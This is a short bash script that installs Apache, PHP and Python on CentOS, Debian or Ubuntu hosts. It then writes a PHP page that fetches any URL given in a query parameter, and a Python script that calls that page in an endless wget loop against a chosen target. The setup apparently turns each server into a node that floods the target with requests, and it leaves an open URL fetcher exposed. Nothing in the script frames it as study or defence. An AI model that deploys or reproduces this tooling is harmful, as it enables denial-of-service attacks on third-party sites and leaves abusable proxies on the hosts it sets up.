#!/bin/bash

DISTRO=$(lsb_release -a 2>/dev/null)
if [ $(echo $DISTRO | grep -i "CentOs" | wc -l) -eq 1 ]; then
        yum install httpd -y
        yum install python gcc screen -y
        sudo iptables -I INPUT -p tcp --dport 80 -j ACCEPT
        sudo service iptables save
        sudo yum install php php-mysql php-devel php-gd php-pecl-memcache php-pspell php-snmp php-xmlrpc php-xml
        sudo service httpd restart
        yum install python-setuptools -y
        curl "https://bootstrap.pypa.io/get-pip.py" -o "get-pip.py"
        python get-pip.py
        pip install ipgetter


elif [ $(echo $DISTRO | grep -i "Debian" | wc -l) -eq 1 ]; then
        apt-get install php libapache2-mod-php php-mcrypt php-mysql -y
        apt-get install apache2 -y
        apt-get install python gcc screen -y
        sudo service apache2 restart

elif [ $(echo $DISTRO | grep -i "Ubuntu" | wc -l) -eq 1 ]; then
        apt-get install php libapache2-mod-php php-mcrypt php-mysql -y
        apt-get install apache2 -y
        apt-get install python gcc screen -y
        sudo service apache2 restart
else
        echo "Unknown OS"
fi


echo "<?php file_get_contents(\$_GET['url']);" > /var/www/html/url.php

echo "import os" > /var/www/html/send.py
echo "import ipgetter" >> /var/www/html/send.py
echo "import sys" >> /var/www/html/send.py
echo "ip = ipgetter.myip()" >> /var/www/html/send.py
echo "url = sys.argv[1]" >> /var/www/html/send.py
echo "while True:" >> /var/www/html/send.py
echo "    os.system(\"wget http://%s/url.php?url=%s\" % (ip, url))" >> /var/www/html/send.py
echo "    os.system(\"rm -rf url.php.*\")" >> /var/www/html/send.py
